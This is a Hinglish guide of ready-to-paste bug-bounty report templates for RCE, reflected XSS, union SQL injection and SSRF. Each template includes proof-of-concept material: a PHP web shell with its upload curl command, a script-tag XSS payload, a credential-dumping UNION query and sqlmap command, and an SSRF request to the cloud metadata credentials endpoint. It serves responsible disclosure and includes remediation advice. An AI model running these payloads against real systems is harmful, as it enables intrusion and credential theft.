# 05 – Reporting Templates (Hinglish)

A well‑structured report is the key to getting paid fast. Below are ready‑to‑use markdown templates you can copy‑paste into HackerOne, Bugcrowd, ya kisi aur platform ke report box.

---

## 📄 Template 1 – Remote Code Execution (RCE)
```markdown
**Title:** Remote Code Execution via Unauthenticated File Upload
**Severity:** Critical (Remote Code Execution)

**Summary:**
A vulnerable file‑upload endpoint allows an attacker to upload a malicious PHP web‑shell without authentication. The uploaded shell can be accessed at `https://target.com/uploads/shell.php` and provides full server command execution.

**Steps to Reproduce:**
1. Send a POST request to `https://target.com/api/upload` with multipart/form-data:
   - `file` = `shell.php` (payload below).
2. Receive HTTP 200 response with file path.
3. Access `https://target.com/uploads/shell.php` and execute `?cmd=id`.

**Proof‑of‑Concept (cURL):**
```bash
curl -X POST "https://target.com/api/upload" \
  -F "file=@shell.php"
```
**shell.php**:
```php
<?php system($_GET['cmd']); ?>
```

**Impact:**
Full server control – can read/write files, pivot to internal network, steal credentials.

**Remediation:**
- Validate file type & enforce whitelist (e.g., only images).
- Store uploads outside web root or rename them.
- Implement authentication & rate‑limit on upload endpoint.

**References:**
- OWASP File Upload Cheat Sheet – https://owasp.org/www-project-cheat-sheets/cheatsheets/File_Upload_Cheat_Sheet.html
```
---

## 📄 Template 2 – Reflected XSS
```markdown
**Title:** Reflected XSS in Search Parameter
**Severity:** Medium (XSS)

**Summary:**
The `q` parameter of the search page reflects user input without proper encoding, leading to a reflected XSS.

**Steps to Reproduce:**
1. Visit `https://target.com/search?q=<script>alert('XSS')</script>`.
2. The alert box pops up, confirming script execution.

**Proof‑of‑Concept (Burp Repeater):**
```
GET /search?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1
Host: target.com
```

**Impact:**
Potential to steal session cookies, perform actions on behalf of logged‑in users.

**Remediation:**
- Encode output using `htmlspecialchars` or similar.
- Implement Content‑Security‑Policy (CSP) with `script-src 'self'`.
- Validate and sanitize input on server side.

**References:**
- XSS (Cross‑Site Scripting) – OWASP: https://owasp.org/www-community/attacks/xss/
```
---

## 📄 Template 3 – SQL Injection (Union‑Based)
```markdown
**Title:** Union‑Based SQL Injection in `id` Parameter
**Severity:** High (SQLi)

**Summary:**
The `id` GET parameter is concatenated directly into an SQL query, allowing a union‑based injection that extracts user credentials.

**Steps to Reproduce:**
1. Request:
   `https://target.com/profile?id=1 UNION SELECT username,password FROM users--`
2. Application returns a table with usernames and password hashes.

**Proof‑of‑Concept (sqlmap):**
```bash
sqlmap -u "https://target.com/profile?id=1" --dump -D dbname -T users
```

**Impact:**
Exposure of all user accounts, password reuse risk.

**Remediation:**
- Use prepared statements / parameterised queries.
- Apply least‑privilege database account.
- Sanitize numeric parameters (`is_numeric`).

**References:**
- OWASP SQL Injection Prevention Cheat Sheet – https://owasp.org/www-project-cheat-sheets/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
```
---

## 📄 Template 4 – Server‑Side Request Forgery (SSRF)
```markdown
**Title:** SSRF via Image URL Parameter
**Severity:** High (SSRF)

**Summary:**
The `img` parameter of the image preview endpoint fetches external URLs without restriction, allowing internal network probing.

**Steps to Reproduce:**
1. Request:
   `https://target.com/preview?img=http://127.0.0.1:3306`
2. Server returns a MySQL error page, confirming internal access.

**Proof‑of‑Concept (curl):**
```bash
curl "https://target.com/preview?img=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Impact:**
Potential to access internal services, cloud metadata, leading to credential theft.

**Remediation:**
- Whitelist allowed domains (e.g., only `https://cdn.example.com`).
- Validate URL schema and hostname.
- Use outbound proxy with allowlist.

**References:**
- SSRF – OWASP: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
```
---

### 📂 How to Use
1. Copy the desired template.
2. Fill in target‑specific details (URL, payload, screenshots).
3. Paste into the bounty platform’s markdown editor.
4. Attach any supporting files (e.g., `shell.php`, screenshots).

Good luck, aur yaad rakh – *clear, concise, and proof‑backed* reports pay the most! 🚀

*Template author: Aniket’s bug bounty helper – Clara*